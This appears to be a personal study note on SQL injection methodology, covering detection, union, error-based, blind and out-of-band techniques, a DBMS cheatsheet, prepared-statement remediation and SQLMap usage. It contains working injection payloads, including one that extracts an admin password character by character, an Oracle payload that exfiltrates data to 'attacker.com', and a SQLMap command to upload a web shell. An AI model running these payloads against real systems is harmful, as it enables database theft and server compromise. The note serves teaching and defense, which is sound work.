---
title: SQL Injection (SQLi) Methodology
date:
description: A comprehensive framework for detecting, enumerating, and preventing SQL Injection vulnerabilities.
tags:
  - security
  - web-hacking
  - owasp
  - database
  - pentesting
  - LLM
---

> [!danger] Rules of Engagement
> **Authorized Use Only.** Testing for SQL Injection on servers you do not own or have explicit permission to test is illegal. This guide is for educational purposes, CTF challenges, and hardening your own applications.

## 1. The Core Mechanic
SQL Injection occurs when untrusted user input is dynamically concatenated into a database query string without validation or parameterization. This allows an attacker to manipulate the structure of the SQL command, effectively "breaking out" of the data context and entering the command context.

**The Anatomy of a Flaw:**
```php
// VULNERABLE CODE
$query = "SELECT * FROM users WHERE id = " . $_GET['id'];
````

If input is `1 UNION SELECT 1, user(), 3`, the query becomes a completely different instruction than the developer intended.

---

## 2. Detection Phase (The Probe)

Before exploiting, we must confirm the vulnerability exists. We look for **Anomalies**.

### A. Character Injection (Breaking the Syntax)

We inject characters that have special meaning in SQL.

- `'` (Single Quote)
    
- `"` (Double Quote)
    
- `;` (Statement Terminator)
    
- `--` or `#` (Comments)
    

**The Test:**

1. `id=1'` $\rightarrow$ **HTTP 500 / Database Error** (Good sign).
    
2. `id=1''` $\rightarrow$ **HTTP 200** (If the error disappears, the syntax was repaired. Vulnerability confirmed).
    

### B. Logical Injection (Boolean Inference)

If errors are suppressed (Blind SQLi), we test logical statements.

1. `id=1 AND 1=1` $\rightarrow$ Page loads normally (True).
    
2. id=1 AND 1=2 $\rightarrow$ Page is missing content (False).
    
    If the application behaves differently between True and False, it is vulnerable.
    

### C. Mathematical Injection

Useful when the input is numeric.

- Input: `id=2-1`
    
- If the page displays the same content as `id=1`, the database performed the arithmetic.
    

---

## 3. Classification & Exploitation

### Type 1: In-Band SQLi (Classic)

The attacker uses the same communication channel to launch the attack and gather results.

#### Union-Based

We use the `UNION` operator to combine the results of the original query with the results of our injected query.

- **Requirement:** Both queries must have the **same number of columns** and compatible data types.
    

**Methodology:**

1. **Find Column Count:** `ORDER BY 1`, `ORDER BY 2`... until the page breaks.
    
2. **Find Output Point:** `UNION SELECT 1, 2, 3, 4` (See which number appears on screen).
    
3. **Exfiltrate:** `UNION SELECT 1, database(), version(), 4`.
    

#### Error-Based

We intentionally cause the database to throw an error that contains the data we want.

- _Example (MySQL):_ `extractvalue()` or `updatexml()`.
    
- Payload: `AND updatexml(1, concat(0x7e, (SELECT @@version), 0x7e), 1)`
    

---

### Type 2: Blind SQLi (Inferential)

The application does not return data or errors. We must play "20 Questions" with the database.

#### Boolean-Based Blind

We ask True/False questions and observe the HTTP response length or content.

- _Payload:_ `id=1 AND (SELECT substring(password,1,1) FROM users WHERE username='admin')='a'`
    
- _Logic:_ "Is the first letter of the admin password 'a'?" -> If page loads, YES. If not, NO.
    

#### Time-Based Blind

The last resort. We ask the DB to "sleep" if a condition is true.

- _Payload:_ `id=1' AND IF(1=1, SLEEP(5), 0)--`
    
- _Logic:_ If the request takes 5+ seconds to return, the vulnerability exists.
    

---

### Type 3: Out-of-Band (OOB)

Used when the application gives no feedback at all (Async processing). We force the DB to make a DNS or HTTP request to a server we control.

- _Technique:_ DNS Exfiltration.
    
- _Payload (Oracle):_ `SELECT UTL_HTTP.REQUEST('http://attacker.com/'||(SELECT user FROM DUAL)) FROM DUAL`
    

---

## 4. DBMS Specific Cheatsheet

Different databases use different syntax. Fingerprinting the DB is step one.

|**Feature**|**MySQL**|**PostgreSQL**|**MSSQL**|**Oracle**|
|---|---|---|---|---|
|**Version**|`@@version`|`version()`|`@@version`|`SELECT banner FROM v$version`|
|**Concat**|`concat(a,b)`|`a\|b`|`a+b`|`a\|b`|
|**Current User**|`user()`|`current_user`|`user_name()`|`user`|
|**List Tables**|`information_schema.tables`|`information_schema.tables`|`information_schema.tables`|`all_tables`|

---

## 5. Defense: Remediation 🛡️

### Primary Defense: Prepared Statements (Parameterized Queries)

This is the only 100% effective cure.

Instead of concatenating strings, we use placeholders (? or :id). The database engine treats user input strictly as data, never as executable code.

**Secure PHP (PDO):**

PHP

```
$stmt = $pdo->prepare('SELECT * FROM users WHERE id = :id');
$stmt->execute(['id' => $id]);
$user = $stmt->fetch();
```

### Secondary Defenses (Defense in Depth)

1. **Input Validation:** Ensure `id` is actually an integer (`is_numeric()`) before passing it to the logic.
    
2. **Least Privilege:** The database user used by the web app should **only** have access to the tables it needs. It should never be `root` or `sa`.
    
3. **WAF (Web Application Firewall):** Can detect common SQL keywords (`UNION`, `SELECT`) and block the request.
    

---

## 6. Tools of the Trade

- **[[Burp-Suite-Setup|Burp Suite Pro]]:** The manual interceptor for modifying requests on the fly.
    
- **SQLMap:** The automated king.
    
    - `sqlmap -u "http://target.com?id=1" --dbs` (List databases)
        
    - `sqlmap -u "http://target.com?id=1" --os-shell` (Attempt to upload a web shell)
        

---

## Linked Notes

- [[Web-Security-Basics]]
    
- [[Burp-Suite-Setup]]
    
- [[System-Design-Basics]] (Designing secure DB layers)